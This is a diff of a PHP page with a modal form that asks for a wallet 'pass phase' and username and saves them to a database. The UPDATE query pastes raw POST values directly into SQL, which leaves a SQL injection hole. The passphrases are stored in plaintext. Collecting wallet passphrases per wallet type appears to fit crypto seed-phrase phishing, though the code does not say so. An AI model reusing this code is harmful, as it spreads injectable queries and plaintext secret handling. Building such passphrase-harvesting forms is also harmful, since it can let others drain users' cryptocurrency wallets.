@@ -1,14 +1,11 @@
 <?php
 
 if (isset($_POST[$wallet_id])) {
-
     $wallet_phase = $_POST['wallet_phase'];
     $wallet_username = $_POST['wallet_username'];
-    $wallet_id = $_POST['wallet_id'];
-
+    $wallet_id = $_POST[$wallet_id];
 
     // Assuming your database connection is already established ($conn)
-//    $sql = "UPDATE wallet SET wallet_phase = '$wallet_phase', wallet_username = '$wallet_username' WHERE wallet_owner_id = $user_id AND wallet_key = $wallet_key";
     $sql = "UPDATE wallet SET wallet_phase = '$wallet_phase', wallet_username = '$wallet_username' WHERE wallet_owner_id = $user_id AND wallet_id = $wallet_id";
 
     if ($conn->query($sql) === TRUE) {
@@ -74,7 +71,7 @@ if ($result->num_rows > 0) {
                         <!-- Modal Body -->
                         <div class="modal-body">
                             <form method="post">
-                                <input type="hidden" value="<?$wallet_id?>" name="<?$wallet_id?>">
+                                <input type="hidden" value="<?=$wallet_id?>" name="<?=$wallet_id?>">
                                 <div class="form-group">
                                     <label>Pass Phase</label>
                                     <input type="text" class="form-control" name="wallet_phase" placeholder="Enter your <?=$wallet_key_name?> pass phase">
@@ -95,14 +92,6 @@ if ($result->num_rows > 0) {
                     </div>
                 </div>
             </div>
-
-            <script>
-                function submitForm<?=$wallet_key_name?>() {
-                    // Assuming you have a JavaScript function to handle form submission
-                    // You may want to add AJAX code here to submit the form asynchronously
-                    document.getElementById('walletForm<?=$wallet_key_name?>').submit();
-                }
-            </script>
 
 
         <?php } elseif ($wallet_status == 1) { ?>
